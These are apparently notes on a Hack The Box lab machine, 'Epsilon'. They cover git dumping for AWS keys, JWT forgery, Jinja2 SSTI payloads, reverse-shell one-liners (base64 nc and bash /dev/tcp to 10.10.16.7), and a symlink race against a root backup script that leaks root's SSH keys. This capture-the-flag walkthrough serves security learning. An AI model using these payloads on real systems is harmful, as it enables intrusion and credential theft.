https://0xdf.gitlab.io/2022/03/10/htb-epsilon.html

### Gitdumper to get aws keys
```bash
/opt/GitTools/Dumper/gitdumper.sh http://10.129.96.151/.git/ .

aws_access_key_id='AQLA5M37BDN6FJP76TDC',
aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
endpoint_url='http://cloud.epsilon.htb')
```

add it to host file

### Explore Lambda
##### aws lambda help. list-functions seems like a good place to start:
```bash
aws lambda list-functions --endpoint-url=http://cloud.epsilon.htb
```

##### Only one function, costume_shop_v1. To get the code, I need the location, which I can find with get-function:
```bash
aws lambda get-function --function-name=costume_shop_v1 --endpoint-url=http://cloud.epsilon.htb
```
##### This output has Code, which has the location of the source. I’ll download that:
```bash
wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
```

### Access Costume Site /home
Use the `secret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124` from lambda and server.py code to forge a jwt token.

```python
>>> import jwt
>>> secret='RrXCv`mrNe!K!4+5`wYq'
>>> jwt.encode({"username":"admin"}, secret, algorithm='HS256')
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4'
```

### SSTI /order
Payloadallthethings win this round

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-ospopenread

```txt
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

All three work fine with burp. Firefox resending is hard to manage as the url encoding is complicated.

##### base64
```burp
costume={{ joiner.__init__.__globals__.os.popen('echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjE2LjcgODAgPi90bXAvZg== | base64 -d | sh').read() }}&q=1&addr=2
```

##### URL encode
```burp
costume={{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >%26 /dev/tcp/10.10.16.7/443 0>%261"').read() }}&q=1&addr=test
```

I’ll need to URL encode the `&` character of the POST request will treat it as a break and a new parameter. I’ll use a Bash reverse shell, with bash -c '' to make sure it’s running in the Bash context 

`bash -c "bash -i >%26 /dev/tcp/10.10.16.7/5000 0>%261"`

### Script
https://gtfobins.github.io/gtfobins/script/

```bash
tom@epsilon:/var/www/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
tom@epsilon:/var/www/app$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo;fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
tom@epsilon:/var/www/app$
```

### Enum root
##### ctf way
`find / -type f -name \*backup\* 2>/dev/null`

##### pspy 
```bash
2023/01/12 02:58:01 CMD: UID=0    PID=65741  | /bin/bash /usr/bin/backup.sh 
2023/01/12 02:58:01 CMD: UID=???  PID=65742  | ???
2023/01/12 02:58:01 CMD: UID=0    PID=65744  | /usr/bin/tar -cvf /opt/backups/622591224.tar /var/www/app/ 
2023/01/12 02:58:01 CMD: UID=0    PID=65746  | /bin/bash /usr/bin/backup.sh 
2023/01/12 02:58:01 CMD: UID=0    PID=65745  | sha1sum /opt/backups/622591224.tar 

tom@epsilon:/tmp$ cat /usr/bin/backup.sh
#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*
```

date +%N returns the nanosecond porton of the current time. This effectively gives a random number.

The script:

    Removes all files and folders in /opt/backups.
    Creates a Tar archive called /opt/backups/[date str].tar with the contents of /var/www/app.
    Creates /opt/backups/checksum which contains the SHA1 hash of the new .tar file.
    Sleeps for five seconds
    Create a new Tar archive in /var/backups/web_backups containing the first archive and the checksum file.
    Remove all files and folders from /opt/backups.

The second `tar` command adds `-h` to the parameters. From the man page:

```bash
-h, --dereference
	Follow symlinks; archive and dump the files they point to.
	```

The vulnerablity is the usage of `h` for tar. It follows symlinks and compress their contents.

In order to exploit it, use `/opt/backups/checksum` to store a symlink to `/root/.ssh`. This must be configured after the first execution of `tar`. We only have around 5 seconds.

### Therefore bash
This will loop ever second, each time checking for the existence of `checksum` in the current directory. When it does exist, it will remove it, and replace it with a symbolic link. Then it prints, sleeps, and prints again, and exits the loop.
```bash
while :; do 
	if test -f checksum; then 
		rm -f checksum; 
		ln -s /root checksum; 
		echo "Replaced checksum"; 
		sleep 5; 
		echo "Backup probably done now";
		break;
	fi; 
	sleep 1; 
done
```

```bash
tom@epsilon:/opt/backups$ chmod +x a.sh 
tom@epsilon:/opt/backups$ ./a.sh 
Replaced checksum

Backup probably done now
tom@epsilon:/opt/backups$ 
tom@epsilon:/opt/backups$ cd /var/backups/web_backups/
tom@epsilon:/var/backups/web_backups$ ls -l
total 79440
-rw-r--r-- 1 root root  1003520 Jan 12 03:55 210287155.tar
-rw-r--r-- 1 root root 80343040 Jan 12 03:56 234453423.tar
tom@epsilon:/var/backups/web_backups$ cp 234453423.tar /dev/shm/
tom@epsilon:/var/backups/web_backups$ cd /dev/shm/
tom@epsilon:/dev/shm$ tar xf 
234453423.tar  multipath/     
tom@epsilon:/dev/shm$ tar xf 234453423.tar 
tar: opt/backups/checksum/.bash_history: Cannot mknod: Operation not permitted
tar: Exiting with failure status due to previous errors
tom@epsilon:/dev/shm$ ls
234453423.tar  multipath  opt
tom@epsilon:/dev/shm$ cd opt/backups/
tom@epsilon:/dev/shm/opt/backups$ ls -l
total 972
-rw-r--r-- 1 tom tom 993280 Jan 12 03:56 223939469.tar
drwx------ 9 tom tom    300 Jan 11 08:16 checksum
tom@epsilon:/dev/shm/opt/backups$ cd checksum/
tom@epsilon:/dev/shm/opt/backups/checksum$ ls -l
total 12
-rw-r--r-- 1 tom tom 356 Nov 17  2021 docker-compose.yml
-rwxr-xr-x 1 tom tom 453 Nov 17  2021 lambda.sh
-rw-r----- 1 tom tom  33 Jan 11 08:16 root.txt
drwxr-xr-x 2 tom tom  60 Dec 20  2021 src
tom@epsilon:/dev/shm/opt/backups/checksum$ cat root.txt 
67f633687ed95cd6232a89ef2a1a2bd9
tom@epsilon:/dev/shm/opt/backups/checksum$ ls .ssh/
authorized_keys  id_rsa  id_rsa.pub
```